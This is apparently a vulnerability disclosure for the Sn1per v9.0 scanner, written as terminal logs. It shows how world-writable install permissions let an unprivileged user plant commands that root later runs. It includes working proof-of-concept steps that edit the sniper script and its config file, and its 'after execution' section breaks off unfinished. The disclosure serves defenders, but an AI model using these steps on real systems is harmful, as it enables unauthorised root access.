root@snipertest:~# uname -a
<br>Linux snipertest 5.11.0-1014-gcp #16-Ubuntu SMP Wed Jul 14 15:51:11 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
<br>
<br>root@snipertest:~# cat  /etc/lsb-release
<br>DISTRIB_ID=Ubuntu
<br>DISTRIB_RELEASE=21.04
<br>DISTRIB_CODENAME=hirsute
<br>DISTRIB_DESCRIPTION="Ubuntu 21.04"
<br>
<br>
<br>https://github.com/1N3/Sn1per
<br>
<br>release v.9.0
<br>
<br>
<br>KALI/UBUNTU/DEBIAN/PARROT LINUX INSTALL:
<br>
<br>git clone https://github.com/1N3/Sn1per
<br>cd Sn1per
<br>bash install.sh
<br>
<br>
<br>
<br>root@snipertest:~# git clone https://github.com/1N3/Sn1per
<br>Cloning into 'Sn1per'...
<br>remote: Enumerating objects: 2838, done.
<br>remote: Counting objects: 100% (13/13), done.
<br>remote: Compressing objects: 100% (9/9), done.
<br>remote: Total 2838 (delta 5), reused 10 (delta 4), pack-reused 2825
<br>Receiving objects: 100% (2838/2838), 43.18 MiB | 18.76 MiB/s, done.
<br>Resolving deltas: 100% (1950/1950), done.
<br>root@snipertest:~# cd Sn1per/
<br>root@snipertest:~/Sn1per# bash install.sh
<br>                ____
<br>    _________  /  _/___  ___  _____
<br>   / ___/ __ \ / // __ \/ _ \/ ___/
<br>  (__  ) / / // // /_/ /  __/ /
<br> /____/_/ /_/___/ .___/\___/_/
<br>               /_/
<br>
<br> + -- --=[ https://xerosecurity.com
<br> + -- --=[ Sn1per by @xer0dayz
<br>
<br>[>] This script will install sn1per under /usr/share/sniper. Are you sure you want to continue? (Hit Ctrl+C to exit)
<br>y
<br>
<br>....
<br>
<br>'/usr/share/sniper/sniper.conf' -> '/root/.sniper.conf'
<br>Please run msfdb as a non-root user
<br>[*] Adding start menu and desktop shortcuts...
<br>[>] Done!
<br>[>] To run, type 'sniper'!
<br>root@snipertest:~/Sn1per#
<br>
<br>
<br>---- ISSUE 1 ----
<br>
<br>Insecure permissions of installation directory (777) allow privilege escalation.
<br>
<br>
<br>root@snipertest:~/Sn1per# which sniper
<br>/usr/bin/sniper
<br>root@snipertest:~/Sn1per# ls -la /usr/bin/sniper
<br>lrwxrwxrwx 1 root root 24 Aug 16 19:41 /usr/bin/sniper -> /usr/share/sniper/sniper
<br>root@snipertest:~/Sn1per# ls -la /usr/share/sniper/sniper
<br>-rwxr-xr-x 1 root root 28290 Aug 16 18:33 /usr/share/sniper/sniper
<br>root@snipertest:~/Sn1per# ls -ld /usr/share/sniper/
<br>drwxrwxrwx 10 root root 4096 Aug 16 19:19 /usr/share/sniper/
<br>root@snipertest:~/Sn1per# ls -la /usr/share/sniper/
<br>total 6668
<br>drwxrwxrwx  10 root root    4096 Aug 16 19:19 .
<br>drwxr-xr-x 222 root root   12288 Aug 16 19:41 ..
<br>-rw-r--r--   1 root root   36518 Aug 16 18:33 CHANGELOG.md
<br>-rw-r--r--   1 root root    1269 Aug 16 18:33 Dockerfile
<br>-rw-r--r--   1 root root     306 Aug 16 18:33 LICENSE.md
<br>-rw-r--r--   1 root root   11697 Aug 16 18:33 README.md
<br>-rw-r--r--   1 root root 6491364 Aug 16 18:33 Sn1per.gif
<br>-rw-r--r--   1 root root  159147 Aug 16 18:33 Sn1per.jpg
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 bin
<br>drwxr-xr-x   2 root root    4096 Aug 16 19:41 conf
<br>-rwxr-xr-x   1 root root   11548 Aug 16 18:33 install.sh
<br>drwxr-xr-x   9 root root    4096 Aug 16 19:42 loot
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 modes
<br>drwxr-xr-x  43 root root    4096 Aug 16 19:27 plugins
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 pro
<br>-rw-r--r--   1 root root     276 Aug 16 18:33 sn1per.desktop
<br>-rw-r--r--   1 root root    4283 Aug 16 18:33 sn1per.png
<br>-rwxr-xr-x   1 root root   28290 Aug 16 18:33 sniper
<br>-rw-r--r--   1 root root    9752 Aug 16 18:33 sniper.conf
<br>drwxr-xr-x   4 root root    4096 Aug 16 18:33 templates
<br>-rwxr-xr-x   1 root root     980 Aug 16 18:33 uninstall.sh
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 wordlists
<br>
<br>
<br>user@snipertest:~$ id
<br>uid=1001(user) gid=1002(user) groups=1002(user),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),117(netdev),118(lxd),1000(ubuntu),1001(google-sudoers)
<br>user@snipertest:~$ cd /usr/share/sniper/
<br>user@snipertest:/usr/share/sniper$ ls -la
<br>total 6668
<br>drwxrwxrwx  10 root root    4096 Aug 16 19:19 .
<br>drwxr-xr-x 222 root root   12288 Aug 16 19:41 ..
<br>-rw-r--r--   1 root root   36518 Aug 16 18:33 CHANGELOG.md
<br>-rw-r--r--   1 root root    1269 Aug 16 18:33 Dockerfile
<br>-rw-r--r--   1 root root     306 Aug 16 18:33 LICENSE.md
<br>-rw-r--r--   1 root root   11697 Aug 16 18:33 README.md
<br>-rw-r--r--   1 root root 6491364 Aug 16 18:33 Sn1per.gif
<br>-rw-r--r--   1 root root  159147 Aug 16 18:33 Sn1per.jpg
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 bin
<br>drwxr-xr-x   2 root root    4096 Aug 16 19:41 conf
<br>-rwxr-xr-x   1 root root   11548 Aug 16 18:33 install.sh
<br>drwxr-xr-x   9 root root    4096 Aug 16 19:42 loot
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 modes
<br>drwxr-xr-x  43 root root    4096 Aug 16 19:27 plugins
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 pro
<br>-rw-r--r--   1 root root     276 Aug 16 18:33 sn1per.desktop
<br>-rw-r--r--   1 root root    4283 Aug 16 18:33 sn1per.png
<br>-rwxr-xr-x   1 root root   28290 Aug 16 18:33 sniper
<br>-rw-r--r--   1 root root    9752 Aug 16 18:33 sniper.conf
<br>drwxr-xr-x   4 root root    4096 Aug 16 18:33 templates
<br>-rwxr-xr-x   1 root root     980 Aug 16 18:33 uninstall.sh
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 wordlists
<br>
<br>Issue:
<br>
<br>Lines 37-40 of install script
<br>
<br>mkdir -p $INSTALL_DIR 2> /dev/null
<br>chmod 777 -Rf $INSTALL_DIR 2> /dev/null
<br>chown root $INSTALL_DIR/sniper 2> /dev/null
<br>chmod 4777 $INSTALL_DIR/sniper 2> /dev/null
<br>
<br>
<br>PoC via script modification:
<br>
<br>user@snipertest:/usr/share/sniper$ mv sniper .sniper.orig
<br>user@snipertest:/usr/share/sniper$ echo "touch /proof" > sniper
<br>user@snipertest:/usr/share/sniper$ cat .sniper.orig >> sniper
<br>user@snipertest:/usr/share/sniper$ chmod +x sniper
<br>user@snipertest:/usr/share/sniper$ ls -la sniper
<br>-rwxrwxr-x 1 user user 28303 Aug 16 19:48 sniper
<br>user@snipertest:/usr/share/sniper$
<br>
<br>
<br>root@snipertest:~# sniper
<br>[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
<br>[*] Loaded configuration file from /root/.sniper.conf [OK]
<br>                ____
<br>    _________  /  _/___  ___  _____
<br>   / ___/ __ \ / // __ \/ _ \/ ___/
<br>  (__  ) / / // // /_/ /  __/ /
<br> /____/_/ /_/___/ .___/\___/_/
<br>               /_/
<br>
<br> + -- --=[ https://xerosecurity.com
<br> + -- --=[ Sn1per v9.0 by @xer0dayz
<br>
<br>You need to specify a target or workspace to use. Type sniper --help for command usage.
<br>root@snipertest:~#
<br>
<br>root@snipertest:~# ls -la /proof
<br>-rw-r--r-- 1 root root 0 Aug 16 19:49 /proof
<br>
<br>PoC 2 via config file modification:
<br>
<br>user@snipertest:/usr/share/sniper$ mv sniper.conf .sniper.conf.orig
<br>user@snipertest:/usr/share/sniper$ echo "touch /proof2" > sniper.conf
<br>user@snipertest:/usr/share/sniper$ cat .sniper.conf.orig >> sniper.conf
<br>user@snipertest:/usr/share/sniper$
<br>
<br>root@snipertest:~# ls -la /proof2
<br>ls: cannot access '/proof2': No such file or directory
<br>root@snipertest:~# sniper
<br>[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
<br>[*] Loaded configuration file from /root/.sniper.conf [OK]
<br>                ____
<br>    _________  /  _/___  ___  _____
<br>   / ___/ __ \ / // __ \/ _ \/ ___/
<br>  (__  ) / / // // /_/ /  __/ /
<br> /____/_/ /_/___/ .___/\___/_/
<br>               /_/
<br>
<br> + -- --=[ https://xerosecurity.com
<br> + -- --=[ Sn1per v9.0 by @xer0dayz
<br>
<br>You need to specify a target or workspace to use. Type sniper --help for command usage.
<br>root@snipertest:~# ls -la /proof2
<br>-rw-r--r-- 1 root root 0 Aug 16 19:52 /proof2
<br>root@snipertest:~#
<br>
<br>
<br>---- ISSUE 2 ----
<br>
<br>Scanner sets insecure permissions on /usr/share/sniper and it's contents on execution. All file permissions are set to 777 while scanner script is set to 4777, allowing privilege escalation to root.
<br>
<br>Before first execution:
<br>
<br>root@snipertest:~# ls -la /usr/share/sniper/
<br>total 6668
<br>drwxrwxrwx  10 root root    4096 Aug 16 19:19 .
<br>drwxr-xr-x 222 root root   12288 Aug 16 19:41 ..
<br>-rw-r--r--   1 root root   36518 Aug 16 18:33 CHANGELOG.md
<br>-rw-r--r--   1 root root    1269 Aug 16 18:33 Dockerfile
<br>-rw-r--r--   1 root root     306 Aug 16 18:33 LICENSE.md
<br>-rw-r--r--   1 root root   11697 Aug 16 18:33 README.md
<br>-rw-r--r--   1 root root 6491364 Aug 16 18:33 Sn1per.gif
<br>-rw-r--r--   1 root root  159147 Aug 16 18:33 Sn1per.jpg
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 bin
<br>drwxr-xr-x   2 root root    4096 Aug 16 19:41 conf
<br>-rwxr-xr-x   1 root root   11548 Aug 16 18:33 install.sh
<br>drwxr-xr-x   9 root root    4096 Aug 16 19:42 loot
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 modes
<br>drwxr-xr-x  43 root root    4096 Aug 16 19:27 plugins
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 pro
<br>-rw-r--r--   1 root root     276 Aug 16 18:33 sn1per.desktop
<br>-rw-r--r--   1 root root    4283 Aug 16 18:33 sn1per.png
<br>-rwxr-xr-x   1 root root   28290 Aug 16 18:33 sniper
<br>-rw-r--r--   1 root root    9752 Aug 16 18:33 sniper.conf
<br>drwxr-xr-x   4 root root    4096 Aug 16 18:33 templates
<br>-rwxr-xr-x   1 root root     980 Aug 16 18:33 uninstall.sh
<br>drwxr-xr-x   2 root root    4096 Aug 16 18:33 wordlists
<br>
<br>
<br>root@snipertest:~# sniper -t 192.168.1.1
<br>[*] Loaded configuration file from /usr/share/sniper/sniper.conf [OK]
<br>[*] Loaded configuration file from /root/.sniper.conf [OK]
<br>[*] Saving loot to /usr/share/sniper/loot/ [OK]
<br>[*] Scanning 192.168.1.1 [OK]
<br>...
<br>[*] Opening loot directory /usr/share/sniper/loot/workspace/192.168.1.1 [OK]
<br> + -- --=[ Generating reports...
<br>[]
<br> + -- --=[ Sorting all files...
<br> + -- --=[ Removing blank screenshots and files...
<br> + -- --=[ Sn1per Professional is not installed. To download Sn1per Professional, go to https://xerosecurity.com.
<br> + -- --=[ Done!
<br>
<br>
<br>After execution:
<br>
<br>Is
<br>
<br>Issue:
<br>
<br>Lines 464-466 from init function
<br>
<br>  chmod 777 -Rf $INSTALL_DIR 2> /dev/null
<br>  chown root $INSTALL_DIR/sniper 2> /dev/null
<br>  chmod 4777 $INSTALL_DIR/sniper 2> /dev/null
<br>  
<br>
